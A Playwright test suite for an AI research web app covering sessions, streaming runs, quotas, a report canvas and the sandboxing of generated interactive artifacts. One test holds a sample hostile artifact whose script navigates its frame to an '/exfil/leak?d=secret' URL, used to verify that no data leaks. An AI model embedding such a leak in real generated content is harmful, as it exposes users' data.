import { test, expect, type Page } from '@playwright/test';

// Every test runs from its own "IP": the app limits runs per IP (3x the per-device limit), and one shared
// address would run out of quota halfway through the suite.
test.beforeEach(async ({ context }) => {
  const octet = () => 1 + Math.floor(Math.random() * 250);
  await context.setExtraHTTPHeaders({ 'x-forwarded-for': `203.${octet()}.${octet()}.${octet()}` });
});

/** Starts a run from the page's own session and returns its id without reading the stream. */
async function startRunId(page: Page, prompt: string): Promise<string> {
  const id = await page.evaluate(async (p) => {
    const res = await fetch('/api/run', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ prompt: p }),
    });
    return res.headers.get('x-run-id');
  }, prompt);
  expect(id).toBeTruthy();
  return id as string;
}

test.describe('app shell', () => {
  test('lists this browser\'s sessions in the sidebar and opens one', async ({ page }) => {
    await page.goto('/');
    await expect(page.getByRole('link', { name: 'New research', exact: true })).toBeVisible();
    const id = await startRunId(page, 'sidebar session test');
    await page.reload();
    const item = page.getByRole('link', { name: /sidebar session test/ });
    await expect(item).toBeVisible();
    await item.click();
    await expect(page).toHaveURL(new RegExp(`/run/${id}$`));
  });

  test('does not show another browser\'s sessions', async ({ browser, page }) => {
    await page.goto('/');
    await startRunId(page, 'private session of browser one');
    const other = await browser.newContext();
    const page2 = await other.newPage();
    await page2.goto('/');
    await expect(page2.getByRole('link', { name: /private session of browser one/ })).toHaveCount(0);
    await other.close();
  });

  test('toggles the theme', async ({ page }) => {
    await page.goto('/');
    const html = page.locator('html');
    const before = await html.evaluate((el) => el.classList.contains('dark'));
    await page.getByRole('button', { name: 'Toggle theme' }).click();
    await expect.poll(() => html.evaluate((el) => el.classList.contains('dark'))).toBe(!before);
  });
});

/** Starts a run and reads its stream to the end, returning the run id. */
async function finishedRunId(page: Page, prompt: string): Promise<string> {
  const id = await page.evaluate(async (p) => {
    const res = await fetch('/api/run', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ prompt: p }),
    });
    const reader = res.body!.getReader();
    while (!(await reader.read()).done) { /* drain */ }
    return res.headers.get('x-run-id');
  }, prompt);
  return id as string;
}

test.describe('run view', () => {
  test('a finished run shows the prompt, the timeline with its details, and the TLDR', async ({ page }) => {
    await page.goto('/');
    const id = await finishedRunId(page, 'legal rag chunking strategies');
    await page.goto(`/run/${id}`);

    await expect(page.getByText('legal rag chunking strategies').first()).toBeVisible();
    await expect(page.getByText(/Section-aware chunking helps legal RAG retrieve whole clauses/)).toBeVisible();

    const trigger = page.getByRole('button', { name: /Research complete/ }).first();
    if (!(await page.getByText('legal RAG chunking strategies retrieval quality').first().isVisible())) await trigger.click();
    for (const step of ['Plan', 'Search', 'Read', 'Write', 'Interactive view']) {
      await expect(page.getByText(step, { exact: true }).first()).toBeVisible();
    }
  });

  test('shows a clear message for a run that does not exist', async ({ page }) => {
    await page.goto('/run/00000000-0000-4000-8000-000000000000');
    await expect(page.getByRole('alert').filter({ hasText: /doesn.t exist/ })).toBeVisible();
  });
});

test.describe('home', () => {
  test('shows the prompt, fills it from a suggestion, and streams a run live', async ({ page }) => {
    await page.goto('/');
    await expect(page.getByRole('heading', { name: /What do you want researched/i })).toBeVisible();

    const suggestion = page.getByRole('button', { name: /chunking strategies affect retrieval quality/i });
    await suggestion.click();
    const box = page.getByRole('textbox');
    await expect(box).toHaveValue(/chunking strategies/);

    await page.getByRole('button', { name: 'Send' }).click();

    // live progress arrives before the run finishes
    await expect(page.getByText('Researching…').first()).toBeVisible();
    await expect(page.getByText(/Section-aware chunking helps legal RAG retrieve whole clauses/)).toBeVisible();
    await expect(page).toHaveURL(/\/run\/[0-9a-f-]{36}$/);

    // the new session shows up in the sidebar
    await expect(page.getByRole('link', { name: /chunking strategies affect retrieval quality/i }).first()).toBeVisible();
  });

  test('will not submit a prompt that is too short', async ({ page }) => {
    await page.goto('/');
    await page.getByRole('textbox').fill('hi');
    await expect(page.getByRole('button', { name: 'Send' })).toBeDisabled();
  });

  test('blocks a device after its daily quota with a clear message', async ({ page }) => {
    for (let i = 0; i < 2; i++) {
      await page.goto('/');
      await page.getByRole('textbox').fill(`quota test run number ${i}`);
      await page.getByRole('button', { name: 'Send' }).click();
      await expect(page.getByText(/Research complete/).first()).toBeVisible({ timeout: 30_000 });
    }
    await page.goto('/');
    await page.getByRole('textbox').fill('quota test run number three');
    await page.getByRole('button', { name: 'Send' }).click();
    await expect(page.getByRole('alert').filter({ hasText: /tomorrow/i })).toBeVisible();
  });
});

const REPORT_CANVAS = 'Report canvas';

async function startAndWaitForCanvas(page: Page, prompt: string) {
  await page.goto('/');
  await page.getByRole('textbox').fill(prompt);
  await page.getByRole('button', { name: 'Send' }).click();
  return page.getByRole('complementary', { name: REPORT_CANVAS });
}

test.describe('canvas', () => {
  test('stays closed while the report is written, opens by itself when ready, and can be collapsed and reopened', async ({ page }) => {
    const canvas = await startAndWaitForCanvas(page, 'canvas behaviour test run');
    await expect(page.getByText('Researching…').first()).toBeVisible();
    await expect(canvas).toHaveCount(0); // not open during planning, search and reading

    await expect(canvas).toBeVisible({ timeout: 30_000 });
    await expect(canvas.getByRole('heading', { name: 'Chunking for legal RAG' })).toBeVisible();

    await page.getByRole('button', { name: 'Collapse canvas' }).click();
    await expect(canvas).toHaveCount(0);
    await page.getByRole('button', { name: 'Open report' }).click();
    await expect(canvas).toBeVisible();
  });

  test('citation markers become hover previews and sources become cards', async ({ page }) => {
    const canvas = await startAndWaitForCanvas(page, 'citation hover test run');
    await expect(canvas).toBeVisible({ timeout: 30_000 });
    const sources = canvas.getByRole('region', { name: 'Sources' });
    await expect(sources.getByRole('link')).toHaveCount(3);

    const chip = canvas.locator('article').getByText('1', { exact: true }).first();
    await chip.hover();
    await expect(page.getByText('example.test').first()).toBeVisible();
  });

  test('the interactive view runs in a sandbox that cannot reach the page, cookies or network', async ({ page }) => {
    const canvas = await startAndWaitForCanvas(page, 'sandbox security test run');
    await expect(canvas).toBeVisible({ timeout: 30_000 });
    await canvas.getByRole('tab', { name: /Interactive view/ }).click();

    const iframe = canvas.locator('iframe[title="Interactive view"]');
    await expect(iframe).toBeVisible({ timeout: 30_000 });
    await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts');

    const frame = page.frameLocator('iframe[title="Interactive view"]');
    await frame.getByRole('button', { name: 'Show details' }).click(); // it is interactive
    await expect(frame.getByText(/Section-aware chunking keeps clauses/)).toBeVisible();
    await expect(frame.locator('#probe')).toHaveText('{"cookie":"blocked","parent":"blocked","fetch":"blocked"}');
  });

  test('the canvas opens at about 55% of the content width', async ({ page }) => {
    const canvas = await startAndWaitForCanvas(page, 'canvas width test run');
    await expect(canvas).toBeVisible({ timeout: 30_000 });
    await page.waitForTimeout(500);
    const main = (await page.locator('main').boundingBox())!;
    const box = (await canvas.boundingBox())!;
    expect(box.width / main.width).toBeGreaterThan(0.5);
    expect(box.width / main.width).toBeLessThan(0.6);
  });

  test('the research steps stay open after the run finishes', async ({ page }) => {
    await startAndWaitForCanvas(page, 'steps stay open test run');
    await expect(page.getByRole('button', { name: 'Compare cost and speed' })).toBeVisible({ timeout: 30_000 });
    await page.waitForTimeout(500);
    await expect(page.getByRole('button', { name: /^Research complete/ })).toHaveAttribute('aria-expanded', 'true');
    for (const name of [/^Plan/, /^Search/, /^Read/, /^Write/, /^Interactive view/]) {
      await expect(page.getByRole('button', { name }).first()).toHaveAttribute('aria-expanded', 'true');
    }
  });

  test('the sidebar closes when research starts', async ({ page }) => {
    await page.goto('/');
    const sidebar = page.locator('[data-slot="sidebar"][data-state]').first();
    await expect(sidebar).toHaveAttribute('data-state', 'expanded');
    await page.getByRole('textbox').fill('sidebar closes test run');
    await page.getByRole('button', { name: 'Send' }).click();
    await expect(sidebar).toHaveAttribute('data-state', 'collapsed');
  });

  test('REVIEW (final): the interactive view keeps its state when switching tabs and back', async ({ page }) => {
    const canvas = await startAndWaitForCanvas(page, 'tab state test run');
    await expect(canvas).toBeVisible({ timeout: 30_000 });
    await canvas.getByRole('tab', { name: /Interactive view/ }).click();
    const frame = page.frameLocator('iframe[title="Interactive view"]');
    await frame.getByRole('button', { name: 'Show details' }).click();
    await expect(frame.getByText(/Section-aware chunking keeps clauses/)).toBeVisible();

    await canvas.getByRole('tab', { name: 'Report' }).click();
    await canvas.getByRole('tab', { name: /Interactive view/ }).click();
    await expect(frame.getByText(/Section-aware chunking keeps clauses/)).toBeVisible();
  });

  test('REVIEW (final): collapsing and reopening the canvas does not reset the thread', async ({ page }) => {
    const canvas = await startAndWaitForCanvas(page, 'thread state test run');
    await expect(canvas).toBeVisible({ timeout: 30_000 });
    await expect(page.getByRole('button', { name: 'Compare cost and speed' })).toBeVisible({ timeout: 30_000 }); // run finished
    const all = page.getByRole('button', { name: /^Research complete/ });
    if ((await all.getAttribute('aria-expanded')) !== 'true') await all.click(); // it folds itself once every step is done
    const step = page.getByRole('button', { name: /^Plan/ });
    await step.click();
    await expect(step).toHaveAttribute('aria-expanded', 'true');

    await page.getByRole('button', { name: 'Collapse canvas' }).click();
    await expect(canvas).toHaveCount(0);
    await expect(step).toHaveAttribute('aria-expanded', 'true');
    await page.getByRole('button', { name: 'Open report' }).click();
    await expect(canvas).toBeVisible();
    await expect(step).toHaveAttribute('aria-expanded', 'true');
  });

  test('REVIEW (final): hovering a citation loads nothing from third-party sites', async ({ page }) => {
    const external: string[] = [];
    page.on('request', (r) => { if (!r.url().startsWith('http://localhost')) external.push(r.url()); });
    const canvas = await startAndWaitForCanvas(page, 'citation privacy test run');
    await expect(canvas).toBeVisible({ timeout: 30_000 });
    await canvas.locator('article').getByText('1', { exact: true }).first().hover();
    await expect(page.getByText('example.test').first()).toBeVisible();
    await page.waitForTimeout(500);
    expect(external.filter((u) => !u.startsWith('data:'))).toEqual([]);
  });

  test('REVIEW FOCUS: a run recorded before artifacts existed still opens, with plain markers and no interactive content', async ({ page }) => {
    const id = '11111111-1111-4111-8111-111111111111';
    const events = [
      { runId: id, seq: 1, ts: 1, type: 'run_started', prompt: 'old run' },
      { runId: id, seq: 2, ts: 2, type: 'report_done', text: '# Old report\n\nA claim [1].\n\n## Sources\n\n1. [Alpha](https://a.test)\n' },
      { runId: id, seq: 3, ts: 3, type: 'run_finished', costUsd: 0.01 },
    ];
    await page.route(`**/api/run/${id}*`, (route) =>
      route.fulfill({ json: { run: { id, prompt: 'old run', status: 'finished' }, events, active: false } }),
    );
    await page.goto(`/run/${id}`);
    const canvas = page.getByRole('complementary', { name: REPORT_CANVAS });
    await expect(canvas.getByRole('heading', { name: 'Old report' })).toBeVisible();
    await expect(canvas.getByText('A claim [1].')).toBeVisible();
    await expect(canvas.getByRole('link', { name: 'Alpha' })).toBeVisible(); // the markdown Sources list is kept
    await canvas.getByRole('tab', { name: /Interactive view/ }).click();
    await expect(canvas.getByText(/No interactive view for this run/)).toBeVisible();
  });
});

test.describe('canvas on a phone', () => {
  test.use({ viewport: { width: 390, height: 844 } });
  test('opens the report in a full-height sheet', async ({ page }) => {
    await page.goto('/');
    await page.getByRole('textbox').fill('mobile canvas test run');
    await page.getByRole('button', { name: 'Send' }).click();
    const sheet = page.getByRole('dialog');
    await expect(sheet.getByRole('heading', { name: 'Chunking for legal RAG' })).toBeVisible({ timeout: 30_000 });
  });
});

test.describe('comparison', () => {
  test('compare cost and speed opens a table with the harness actuals and estimates', async ({ page }) => {
    await page.goto('/');
    await page.getByRole('textbox').fill('comparison modal test run');
    await page.getByRole('button', { name: 'Send' }).click();
    await page.getByRole('button', { name: 'Compare cost and speed' }).click({ timeout: 40_000 });

    const dialog = page.getByRole('dialog');
    await expect(dialog.getByRole('heading', { name: 'Cost and speed comparison' })).toBeVisible();
    const harness = dialog.getByRole('row', { name: /This harness/ });
    await expect(harness).toBeVisible();
    await expect(harness.getByText('Actual')).toBeVisible();
    await expect(dialog.getByRole('row', { name: /Claude Sonnet 5.5/ }).getByText('Estimate')).toBeVisible();

    await dialog.getByRole('button', { name: 'How this is estimated' }).click();
    await expect(dialog.getByText(/20 output tokens/)).toBeVisible();
    await expect(dialog.getByText(/quality is not compared/i)).toBeVisible();
  });

  test('is only offered once the run has finished', async ({ page }) => {
    await page.goto('/');
    await page.getByRole('textbox').fill('comparison availability test run');
    await page.getByRole('button', { name: 'Send' }).click();
    await expect(page.getByText('Researching…').first()).toBeVisible();
    await expect(page.getByRole('button', { name: 'Compare cost and speed' })).toHaveCount(0);
  });
});

test.describe('new research', () => {
  test('REVIEW (final): New research leaves a run that was started from the home page', async ({ page }) => {
    await page.goto('/');
    await page.getByRole('textbox').fill('new research navigation test');
    await page.getByRole('button', { name: 'Send' }).click();
    await expect(page.getByText(/Research complete/).first()).toBeVisible({ timeout: 40_000 });

    await page.getByRole('button', { name: 'Toggle Sidebar' }).first().click(); // closed when research started
    await page.getByRole('link', { name: 'New research', exact: true }).click();
    await expect(page.getByRole('heading', { name: /What do you want researched/i })).toBeVisible();
    await expect(page).toHaveURL(/\/$/);
  });

  test('also leaves a run that is still in progress, and the run can be reopened from the sidebar', async ({ page }) => {
    await page.goto('/');
    await page.getByRole('textbox').fill('leave a live run test');
    await page.getByRole('button', { name: 'Send' }).click();
    await expect(page.getByText('Researching…').first()).toBeVisible();

    await page.getByRole('button', { name: 'Toggle Sidebar' }).first().click(); // closed when research started
    await page.getByRole('link', { name: 'New research', exact: true }).click();
    await expect(page.getByRole('heading', { name: /What do you want researched/i })).toBeVisible();

    await page.getByRole('link', { name: /leave a live run test/ }).click();
    await expect(page.getByText(/Research complete/).first()).toBeVisible({ timeout: 40_000 });
  });
});

test.describe('artifact frame navigation', () => {
  test('REVIEW (final): an artifact cannot make its frame send a request to another page', async ({ page }) => {
    const id = '33333333-3333-4333-8333-333333333333';
    // The artifact tries to leak data by navigating its own frame. What matters is that no request is sent.
    const html =
      '<!doctype html><html><body><p id="marker">STILL HERE</p>' +
      '<script>setTimeout(function(){ location.href = "http://localhost:3100/exfil/leak?d=secret"; }, 300);</script></body></html>';
    const events = [
      { runId: id, seq: 1, ts: 1, type: 'run_started', prompt: 'frame navigation' },
      { runId: id, seq: 2, ts: 2, type: 'report_done', text: '# R\n\nBody.' },
      { runId: id, seq: 3, ts: 3, type: 'artifact_started' },
      { runId: id, seq: 4, ts: 4, type: 'artifact_done', html },
      { runId: id, seq: 5, ts: 5, type: 'run_finished', costUsd: 0 },
    ];
    const leaked: string[] = [];
    await page.route('**/exfil/**', (route) => {
      leaked.push(route.request().url());
      return route.fulfill({ status: 200, contentType: 'text/html', body: 'leaked' });
    });
    await page.route(`**/api/run/${id}*`, (route) =>
      route.fulfill({ json: { run: { id, prompt: 'frame navigation', status: 'finished' }, events, active: false } }),
    );
    await page.goto(`/run/${id}`);
    const canvas = page.getByRole('complementary', { name: 'Report canvas' });
    await canvas.getByRole('tab', { name: /Interactive view/ }).click();
    await expect(page.frameLocator('iframe[title="Interactive view"]').locator('#marker')).toHaveText('STILL HERE');
    await page.waitForTimeout(1500); // long enough for the navigation attempt to have happened
    expect(leaked).toEqual([]);
  });
});
